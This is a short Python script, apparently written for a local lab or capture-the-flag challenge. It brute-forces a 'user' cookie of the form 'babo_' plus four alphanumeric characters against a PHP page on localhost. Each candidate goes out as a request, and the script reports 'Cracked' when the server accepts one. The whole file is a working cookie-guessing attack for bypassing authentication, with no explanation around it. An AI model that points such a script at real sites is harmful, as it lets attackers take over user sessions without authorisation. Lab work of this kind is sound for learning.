import requests

url = 'http://localhost:3000/page-babo.php'

def request_checker(url, random_4char):
    user_value = f"babo_{random_4char}"
    cookies = {
        'user': user_value
    }

    response = requests.get(url, cookies=cookies, allow_redirects=False)
    
    if (response.status_code == 200):
        print(f"Cracked!!! : {user_value}")
        return True
    else:
        print(f"failed : {user_value}")

def buster_4char(characters):
    for c1 in characters:
        for c2 in characters:
            for c3 in characters:
                for c4 in characters:
                    gen = ''.join([c1, c2, c3, c4])
                    if (request_checker(url, random_4char=gen)):
                        return

buster_4char('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')